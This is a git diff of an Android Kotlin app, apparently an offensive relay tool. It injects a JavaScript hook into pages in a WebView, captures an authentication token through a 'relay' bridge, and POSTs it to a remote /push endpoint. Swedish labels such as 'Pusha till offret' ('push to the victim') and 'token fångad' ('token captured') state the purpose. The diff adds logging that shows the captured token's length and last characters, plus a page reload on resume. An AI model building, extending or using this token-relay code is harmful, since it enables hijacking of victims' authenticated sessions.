@@ -2,6 +2,7 @@ package se.ditt.relay
 
 import android.annotation.SuppressLint
 import android.app.Activity
+import android.graphics.Bitmap
 import android.os.Bundle
 import android.view.ViewGroup.LayoutParams.MATCH_PARENT
 import android.view.ViewGroup.LayoutParams.WRAP_CONTENT
@@ -21,7 +22,9 @@ class MainActivity : Activity() {
     private lateinit var service: EditText
     private lateinit var addr: EditText
     private lateinit var push: Button
+    private lateinit var logView: TextView
     private var token: String? = null
+    private var first = true
 
     private val prefs by lazy { getSharedPreferences("relay", MODE_PRIVATE) }
 
@@ -33,6 +36,28 @@ class MainActivity : Activity() {
         } catch (e: Throwable) {
             showError(e)
         }
+    }
+
+    override fun onResume() {
+        super.onResume()
+        if (first) { first = false; return }
+        try {
+            val u = web.url
+            if (u != null && u.startsWith("http")) {
+                log("tillbaka i appen -> laddar om sidan")
+                web.reload()
+            }
+        } catch (e: Throwable) {
+            log("resume: " + e.message)
+        }
+    }
+
+    private fun log(m: String) {
+        try {
+            val all = (m + "\n" + logView.text.toString())
+                .split("\n").filter { it.isNotBlank() }
+            logView.text = all.take(4).joinToString("\n")
+        } catch (e: Throwable) {}
     }
 
     private fun build() {
@@ -48,6 +73,12 @@ class MainActivity : Activity() {
         val go = Button(this).apply {
             text = "Gå"
             setOnClickListener { load() }
+        }
+        logView = TextView(this).apply {
+            textSize = 10f
+            setTextColor(0xFF555555.toInt())
+            setPadding(14, 8, 14, 8)
+            text = "logg"
         }
 
         web = WebView(this)
@@ -70,6 +101,7 @@ class MainActivity : Activity() {
         root.addView(service, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
         root.addView(row2, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
         root.addView(push, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
+        root.addView(logView, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
         root.addView(web, LinearLayout.LayoutParams(MATCH_PARENT, 0, 1f))
         setContentView(root)
 
@@ -83,8 +115,16 @@ class MainActivity : Activity() {
 
         web.addJavascriptInterface(Bridge(), "relay")
         web.webViewClient = object : WebViewClient() {
+            override fun onPageStarted(v: WebView, u: String, f: Bitmap?) {
+                log("sida: " + u.substringAfter("://").take(38))
+            }
             override fun onPageFinished(v: WebView, u: String) {
                 v.evaluateJavascript(HOOK, null)
+            }
+            override fun onReceivedHttpError(
+                v: WebView, r: WebResourceRequest, e: WebResourceResponse
+            ) {
+                log("http " + e.statusCode + "  " + r.url.lastPathSegment)
             }
             override fun shouldOverrideUrlLoading(
                 v: WebView, r: WebResourceRequest
@@ -117,6 +157,7 @@ class MainActivity : Activity() {
             runOnUiThread {
                 push.isEnabled = true
                 push.text = "Pusha till offret  ✓"
+                log("token fångad: " + t.length + " tecken, slutar ..." + t.takeLast(8))
             }
         }
     }
@@ -135,6 +176,7 @@ class MainActivity : Activity() {
 
         push.isEnabled = false
         push.text = "Skickar…"
+        log("pushar till /push/" + id)
 
         Thread {
             try {
@@ -150,16 +192,18 @@ class MainActivity : Activity() {
                 c.doOutput = true
                 c.setRequestProperty("Content-Type", "application/json")
                 c.outputStream.use { it.write(body.toByteArray()) }
-                c.responseCode
+                val code = c.responseCode
 
                 runOnUiThread {
                     push.text = "Pushat ✓  $svc"
+                    log("push: HTTP " + code)
                     token = null
                 }
             } catch (e: Exception) {
                 runOnUiThread {
                     push.text = "Fel: " + e.message
                     push.isEnabled = true
+                    log("push-fel: " + e.message)
                 }
             }
         }.start()
